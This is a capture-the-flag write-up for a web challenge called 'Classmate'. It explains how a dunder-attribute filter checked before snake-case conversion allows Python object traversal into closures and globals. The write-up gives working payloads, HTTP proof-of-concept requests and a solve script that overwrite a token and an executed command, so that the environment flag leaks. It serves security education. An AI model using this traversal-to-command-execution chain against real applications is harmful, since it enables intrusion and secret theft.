# Classmate — Web Challenge Writeup

## TL;DR

The challenge exposes a fake “cloud CLI” over `/api/cli`.  
Two commands, `resource update` and `webapp update`, both pass attacker-controlled `--set` expressions into a generic object traversal helper. That helper tries to block Python dunder attributes, but it applies the check **before** converting names to snake case.

That means names like:

- `_Func__` → `__func__`
- `_Globals__` → `__globals__`
- `_Closure__` → `__closure__`

bypass the restriction.

Using that traversal bug, we can:

1. overwrite the hidden maintenance token stored inside `_maint_check`’s closure
2. overwrite `os._cloud_exec` with our own command
3. call `webapp restart` with our forged token
4. make the process write `$FLAG` into the restart log
5. read it back through `/api/logs/<session>`

No SSRF is required.

---

## Challenge surface

The frontend terminal sends JSON to `/api/cli` and accepts arbitrary argument arrays from the user:

```javascript
fetch('/api/cli', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ args }),
});
```

So anything shown in `help` is reachable directly from the browser. The resource ID is also exposed in the page:

```text
/subscriptions/deadbeef-1337-1337-1337-c0ffee123456/resourceGroups/classmate-rg/providers/Microsoft.Web/sites/classmate-resource-001
```

The useful commands are:

- `resource update`
- `webapp update`
- `webapp notify`
- `webapp restart`

---

## Source audit

### 1. The dangerous sink: `_apply(...)`

Both update commands forward user-controlled expressions into `_apply(...)`:

```python
def _resource_update(args):
    res = Resource(_opt(args, "--ids"))
    _apply(res, _opt(args, "--set"))
    return res.to_dict()

def _webapp_update(args):
    webapp = WebApp(_opt(args, "--ids"))
    _apply(webapp, _opt(args, "--set"))
    return webapp.to_dict()
```

`_apply()` splits `KEY=VALUE`, resolves the object path, then writes the attribute or dict key.

---

### 2. The traversal bug

The bug is in `_resolve()` and `_apply()`:

```python
def _snake(s):
    s = re.sub(r"(.)([A-Z][a-z]+)", r"\1_\2", s)
    return re.sub(r"([a-z0-9])([A-Z])", r"\1_\2", s).lower()

def _resolve(obj, parts):
    for p in parts:
        m = _BRACKET.match(p)
        if m:
            obj = obj[int(m.group(1))]
        elif isinstance(obj, dict):
            obj = obj[p]
        else:
            if p.startswith("__") and p.endswith("__"):
                raise ValueError(f"restricted: {p}")
            obj = getattr(obj, _snake(p))
    return obj
```

and:

```python
attr = parts[-1]
...
s = _snake(attr)
if s.startswith("__") and s.endswith("__"):
    raise ValueError(f"restricted: {attr}")
setattr(target, s, value)
```

The code checks `p.startswith("__")` **before** calling `_snake(p)`.

So if we use `_Func__`, it is not rejected as a dunder name, but `_snake("_Func__")` becomes `__func__`.

That gives us a generic dunder bypass.

Useful gadgets:

- `toDict._Func__` → `to_dict.__func__`
- `..._Globals__` → `__globals__`
- `..._Closure__` → `__closure__`

---

### 3. Hidden maintenance token

The restart command requires a maintenance token:

```python
def _webapp_restart(args):
    rid      = _opt(args, "--ids")
    token    = _opt(args, "--token")
    if not _maint_check(token):
        raise PermissionError("maintenance mode is not active")
```

The token is stored in a closure:

```python
def _make_check():
    state = {"token": secrets.token_hex(8)}
    def _inner(given):
        return bool(state["token"]) and given == state["token"]
    return _inner

_maint_check = _make_check()
```

The app even exposes `/internal/maint`, but only to localhost. That hints at SSRF, but SSRF is unnecessary because the closure is directly writable via the traversal bug.

To overwrite the token, we can reach:

```python
_maint_check.__closure__[0].cell_contents["token"]
```

through the bypassed path:

```text
toDict._Func__._Globals__._maint_check._Closure__.[0].cellContents.token
```

Note the final `cellContents` becomes `cell_contents` after `_snake()`.

---

### 4. Command execution primitive in restart

Once the token check passes, restart executes `os._cloud_exec`:

```python
session  = str(uuid.uuid4())
log_path = f"/tmp/cloud_cli_{session}.log"
env      = {**os.environ, "CLOUD_SESSION_LOG": log_path}

subprocess.run(
    os._cloud_exec,
    capture_output=True,
    text=True,
    timeout=5,
    env=env,
)
```

Then it returns the session ID, and the logs endpoint reads that file:

```python
@app.route("/api/logs/<session_id>")
def webapp_logs(session_id):
    path = f"/tmp/cloud_cli_{session_id}.log"
    with open(path) as f:
        content = f.read().strip()
    os.unlink(path)
    return jsonify({"content": content})
```

There is also a reset in `finally`:

```python
_maint_check.__closure__[0].cell_contents["token"] = secrets.token_hex(8)
os._cloud_exec = ["echo", "restarted"]
```

So we only get **one shot per request chain**, but that is enough.

---

### 5. Where the flag is

The flag is an environment variable:

```yaml
environment:
  - FLAG=PUCTF26{fake_flag}
```

In the real deployment, that is the real flag. The container is read-only, but `/tmp` is writable:

```yaml
read_only: true
tmpfs:
  - /tmp:rw,size=64m
```

That is perfect for the restart log path.

---

## Exploit idea

We do not need to spawn a shell. We only need to replace `os._cloud_exec` with a command that writes `$FLAG` into `$CLOUD_SESSION_LOG`.

A simple payload is:

```json
["sh","-c","printf %s \"$FLAG\" > \"$CLOUD_SESSION_LOG\""]
```

Then:

1. set maintenance token to a known value
2. set `os._cloud_exec` to the payload above
3. call `webapp restart --token <known value>`
4. receive `session`
5. fetch `/api/logs/<session>`
6. read the flag

---

## Exact exploit path

### Step 1: overwrite the hidden token

`resource update` is enough.

`--set` value:

```text
toDict._Func__._Globals__._maint_check._Closure__.[0].cellContents.token="pwnedtoken"
```

---

### Step 2: overwrite `os._cloud_exec`

Another `resource update`:

```text
toDict._Func__._Globals__.os._cloud_exec=["sh","-c","printf %s \"$FLAG\" > \"$CLOUD_SESSION_LOG\""]
```

---

### Step 3: trigger restart

```text
webapp restart --ids <RID> --token pwnedtoken
```

The response includes a UUID-like `session`.

---

### Step 4: retrieve the log

```http
GET /api/logs/<session>
```

The response body contains the flag.

---

## HTTP PoC

### Overwrite token

```http
POST /api/cli
Content-Type: application/json

{
  "args": [
    "resource", "update",
    "--ids", "/subscriptions/deadbeef-1337-1337-1337-c0ffee123456/resourceGroups/classmate-rg/providers/Microsoft.Web/sites/classmate-resource-001",
    "--set", "toDict._Func__._Globals__._maint_check._Closure__.[0].cellContents.token=\"pwnedtoken\""
  ]
}
```

### Overwrite execution command

```http
POST /api/cli
Content-Type: application/json

{
  "args": [
    "resource", "update",
    "--ids", "/subscriptions/deadbeef-1337-1337-1337-c0ffee123456/resourceGroups/classmate-rg/providers/Microsoft.Web/sites/classmate-resource-001",
    "--set", "toDict._Func__._Globals__.os._cloud_exec=[\"sh\",\"-c\",\"printf %s \\\"$FLAG\\\" > \\\"$CLOUD_SESSION_LOG\\\"\"]"
  ]
}
```

### Restart

```http
POST /api/cli
Content-Type: application/json

{
  "args": [
    "webapp", "restart",
    "--ids", "/subscriptions/deadbeef-1337-1337-1337-c0ffee123456/resourceGroups/classmate-rg/providers/Microsoft.Web/sites/classmate-resource-001",
    "--token", "pwnedtoken"
  ]
}
```

Response:

```json
{
  "status": "restarted",
  "resource": "...",
  "session": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
}
```

### Read flag

```http
GET /api/logs/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
```

---

## Solve script

```python
#!/usr/bin/env python3
import time
import requests

BASE = "http://chal.polyuctf.com:XXXXX"
RID = "/subscriptions/deadbeef-1337-1337-1337-c0ffee123456/resourceGroups/classmate-rg/providers/Microsoft.Web/sites/classmate-resource-001"
TOKEN = "pwnedtoken"


def cli(args):
    r = requests.post(f"{BASE}/api/cli", json={"args": args}, timeout=10)
    print("[*]", r.status_code, r.text)
    r.raise_for_status()
    return r.json()


cli([
    "resource", "update",
    "--ids", RID,
    "--set", 'toDict._Func__._Globals__._maint_check._Closure__.[0].cellContents.token="pwnedtoken"'
])

cli([
    "resource", "update",
    "--ids", RID,
    "--set", 'toDict._Func__._Globals__.os._cloud_exec=["sh","-c","printf %s \\"$FLAG\\" > \\"$CLOUD_SESSION_LOG\\""]'
])

resp = cli([
    "webapp", "restart",
    "--ids", RID,
    "--token", TOKEN
])

session = resp["session"]
time.sleep(0.2)

r = requests.get(f"{BASE}/api/logs/{session}", timeout=10)
print("[+] flag response:", r.text)
```

---

## Why SSRF was a trap

`webapp notify` can fetch arbitrary HTTP(S) URLs with a denylist for localhost and RFC1918 space. That strongly suggests SSRF:

```python
if parsed.scheme not in ("http", "https"):
    raise ValueError("scheme must be http or https")
...
if _URL_DENYLIST.search(host):
    raise ValueError("webhook host is not allowed")
with urllib.request.urlopen(webhook, timeout=5) as r:
    ...
```

And `/internal/maint` only allows `127.0.0.1`.

So the intended-looking chain is:

- SSRF `/internal/maint`
- steal token
- restart

But the traversal bug is much stronger: it lets us **overwrite** the token and also overwrite the command executed during restart.

That makes SSRF unnecessary.

---

## Root cause

There are two root causes:

1. **Unsafe object traversal / mass assignment**
   - user input is allowed to walk arbitrary object graphs
   - both attribute read and write are attacker-controlled

2. **Broken dunder filtering**
   - the filter checks the raw token before normalization
   - `_snake()` can transform a “safe-looking” name into a restricted dunder attribute

The combination gives access to Python internals such as function globals and closures.

---

## Final flag path

The flag is not read from disk. It is inherited from the process environment as `FLAG`, then copied into `/tmp/cloud_cli_<session>.log` by our injected command, and finally exposed by `/api/logs/<session>`.

---

## Takeaways

- Never expose generic attribute traversal over user input.
- Never rely on blacklist-style dunder filtering.
- Do not normalize a name *after* validating it.
- If a function executes a mutable global command like `os._cloud_exec`, that object becomes a high-value target.
- Read-only root filesystems do not matter if secrets live in environment variables and writable temp storage exists.

---

## Short solve summary

The challenge is solved by abusing `resource update` / `webapp update` → `_apply()` → dunder bypass via `_snake()` to reach:

- `_maint_check.__closure__[0].cell_contents["token"]`
- `os._cloud_exec`

Then `webapp restart` is used as a controlled command-execution primitive, and `/api/logs/<session>` leaks the result.
